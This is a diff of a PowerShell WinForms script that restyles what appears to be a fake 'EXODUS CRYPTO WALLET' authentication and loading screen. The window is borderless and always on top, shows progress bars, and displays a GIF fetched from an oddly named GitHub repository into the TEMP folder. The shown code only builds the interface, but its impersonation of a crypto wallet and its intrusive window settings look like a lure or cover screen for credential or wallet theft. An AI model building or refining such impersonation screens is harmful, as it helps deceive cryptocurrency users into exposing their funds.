@@ -9,7 +9,7 @@ try {
 
 # ==================== HAUPTFENSTER ====================
 $form = New-Object System.Windows.Forms.Form
-$form.Text = "Exodus"
+$form.Text = "Exodus WALLET"
 $form.StartPosition = "CenterScreen"
 $form.Size = New-Object System.Drawing.Size(1200, 720)
 $form.FormBorderStyle = "None"
@@ -21,22 +21,50 @@ $form.ForeColor = [System.Drawing.Color]::White
 $form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
 $form.TopMost = $true
 
-# ==================== PRODUKTNAME EXODUS (OBEN) ====================
-$productLabel = New-Object System.Windows.Forms.Label
-$productLabel.Font = New-Object System.Drawing.Font(
-    "Segoe UI",
-    32,
-    [System.Drawing.FontStyle]::Bold
-)
-$productLabel.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#00E5FF")  # Neonblau
-$productLabel.Dock = "Top"
-$productLabel.Height = 70
-$productLabel.TextAlign = "MiddleCenter"
-$productLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
-$productLabel.Text = "EXODUS"
-$form.Controls.Add($productLabel)
+# ==================== GRADIENT-HEADER: EXODUS (OBEN) ====================
+$headerPanel = New-Object System.Windows.Forms.Panel
+$headerPanel.Dock = "Top"
+$headerPanel.Height = 90
+$headerPanel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
 
-# ==================== GIF (OBEN, unter Produktname, volle Breite) ====================
+$headerPanel.Add_Paint({
+    param($sender, $e)
+
+    $g = $e.Graphics
+    $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
+
+    $text = "EXODUS CRYPTO WALLET"
+    $font = New-Object System.Drawing.Font(
+        "Segoe UI",
+        44,
+        [System.Drawing.FontStyle]::Bold
+    )
+
+    $sizeF = $g.MeasureString($text, $font)
+    $x = ($sender.ClientSize.Width  - $sizeF.Width)  / 2
+    $y = ($sender.ClientSize.Height - $sizeF.Height) / 2
+
+    $rect = New-Object System.Drawing.RectangleF($x, $y, $sizeF.Width, $sizeF.Height)
+
+    $colorStart = [System.Drawing.ColorTranslator]::FromHtml("#00E5FF") # Neonblau
+    $colorEnd   = [System.Drawing.ColorTranslator]::FromHtml("#7C3AED") # Violett
+
+    $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
+        $rect,
+        $colorStart,
+        $colorEnd,
+        [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal
+    )
+
+    $g.DrawString($text, $font, $brush, $rect.Location)
+
+    $brush.Dispose()
+    $font.Dispose()
+})
+
+$form.Controls.Add($headerPanel)
+
+# ==================== GIF (OBEN, volle Breite, unter EXODUS) ====================
 $gifUrl  = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
 $gifPath = Join-Path $env:TEMP "exodus_loading.gif"
 
@@ -44,14 +72,13 @@ try { (New-Object System.Net.WebClient).DownloadFile($gifUrl, $gifPath) } catch 
 
 $pictureBox = New-Object System.Windows.Forms.PictureBox
 $pictureBox.Dock = "Top"
-$pictureBox.Height = 260
+$pictureBox.Height = 400
 $pictureBox.SizeMode = "Zoom"
 $pictureBox.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
 
 if (Test-Path $gifPath) {
     $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
 }
-
 $form.Controls.Add($pictureBox)
 
 # ==================== HEADER: AUTHENTICATION (MITTE OBEN) ====================
@@ -96,13 +123,12 @@ $progressBg2.Controls.Add($progressBar2)
 $statusLabel = New-Object System.Windows.Forms.Label
 $statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14)
 $statusLabel.ForeColor = "#CCCCCC"
-$statusLabel.Dock = "Bottom"                    # <– jetzt unten
+$statusLabel.Dock = "Bottom"
 $statusLabel.Height = 40
 $statusLabel.TextAlign = "MiddleCenter"
 $statusLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
 
-# Reihenfolge bei Dock=Bottom ist wichtig:
-# Von unten nach oben: progressBg2 (ganz unten), progressBg, statusLabel (direkt darüber)
+# Docking-Reihenfolge für unten: von unten nach oben
 $form.Controls.Add($progressBg2)
 $form.Controls.Add($progressBg)
 $form.Controls.Add($statusLabel)
